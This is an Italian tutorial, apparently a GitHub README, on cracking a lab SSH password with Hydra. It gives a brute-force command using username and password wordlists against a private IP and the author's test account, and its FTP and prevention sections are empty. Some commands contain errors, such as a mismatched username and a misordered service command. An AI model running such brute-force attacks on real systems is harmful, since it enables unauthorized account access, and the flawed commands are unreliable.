# **HYDRA**🐉
[Hydra](https://www.kali.org/tools/hydra/) è uno strumento usato per il cracking di password, è molto apprezzato dagli utenti kali per via
della sua presenza su diversi protoccolli di rete come:  FTP, SMB, POP3, IMAP, MySQL, VNC, SSH, HTTP(S) e altri...

## **Indice**
1. [SSH](ssh-cracking)
2. [FTP](ftp-cracking)
3. [Prevenzioni]()

## **SSH cracking**
Creo un nuovo utente + nome “adduser test_user”
```bash
adduser test_use
#Inserisci la password
```
Avvio servizio
```bash
sudo service start ssh
```
Check connessione
```bash
ssh test_user@192.168.56.102
#la connessione chiede una password... è il momento di usare hydra
```
Hydra
```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.102 -t 4 ssh
```

Risultato<br>
➡️[Password trovata](https://github.com/OctavianIT/Octavian_Ceresau_HydraCrack/blob/main/Octavian_Ceresau_Hydra/Altro/ssh/Password.png)




## **FTP cracking**


